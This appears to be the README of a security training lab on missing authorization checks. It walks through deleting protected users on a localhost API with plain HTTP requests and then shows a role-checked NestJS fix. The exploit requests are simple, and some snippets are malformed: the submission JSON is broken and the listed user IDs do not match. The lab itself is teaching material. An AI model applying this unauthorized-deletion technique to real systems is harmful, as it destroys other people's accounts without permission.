# Access Control Lab 1 - Unauthorized User Deletion

## Objective

Exploit the missing authorization checks to delete protected users.

## Description

This lab simulates a vulnerable user management system that lacks proper access control. Any authenticated user can delete other users, including administrators and protected accounts.

## Vulnerability

- **Type**: Missing Function Level Access Control (OWASP Top 10 - A01:2021)
- **Impact**: High
- **Difficulty**: Easy

## How to Exploit

1. Login to the application
2. Get list of all users: `GET /api/practice-labs/access-control/lab1/users`
3. Delete a protected user without authorization:

   ```bash
   DELETE /api/practice-labs/access-control/lab1/users/2
   Submit deleted user IDs to complete the lab
   ```

## API Endpoints

### Get All Users

```
GET /api/practice-labs/access-control/lab1/users
Authorization: Bearer <token>
```

### Delete User (Vulnerable)

```
DELETE /api/practice-labs/access-control/lab1/users/:id
Authorization: Bearer <token>
```

### Submit Solution

```
POST /api/practice-labs/access-control/lab1/submit
Authorization: Bearer <token>
Content-Type: application/json


{
"deletedUserIds":[1][2]
}
```

### Reset Lab

```
POST /api/practice-labs/access-control/lab1/reset
Authorization: Bearer <token>
Expected Behavior (Secure Implementation)
typescript
// ✅ Proper implementation
@Delete('users/:id')
@Roles('ADMIN')
async deleteUser(@Param('id') id: number, @CurrentUser() user: User) {
if (user.role !== 'ADMIN') {
throw new ForbiddenException('Only admins can delete users');
}
return this.service.deleteUser(id);
}
```

### Learning Points

- Always implement role-based access control (RBAC)

- Verify user permissions before sensitive operations

- Use guards/middleware to enforce authorization

- Follow the principle of least privilege

- Remediation
  - Implement role checks using guards

  - Validate user permissions in service layer

  - Add audit logging for sensitive operations

  - Use decorators like @Roles('ADMIN')

## **📋 API Testing**

### **test.http**

```http
### Login
POST http://localhost:3000/api/auth/login
Content-Type: application/json

{
  "email": "test@example.com",
  "password": "Test@123"
}
```

### Get all users

```
GET http://localhost:3000/api/practice-labs/access-control/lab1/users
Authorization: Bearer {{token}}
```

### Delete user (exploit)

```
DELETE http://localhost:3000/api/practice-labs/access-control/lab1/users/2
Authorization: Bearer {{token}}
```

### Submit solution

```
POST http://localhost:3000/api/practice-labs/access-control/lab1/submit
Content-Type: application/json
Authorization: Bearer {{token}}

{
"deletedUserIds": [2, 3]
}

```

### Reset lab

```
POST http://localhost:3000/api/practice-labs/access-control/lab1/reset
Authorization: Bearer {{token}}
```

### Summary🎯 :

```

✅ Lab: Access Control Vulnerability
✅ Type: Missing Authorization
✅ Endpoint: DELETE /users/:id
✅ Goal: Delete protected users
✅ Points: 100
✅ XP: 50

```
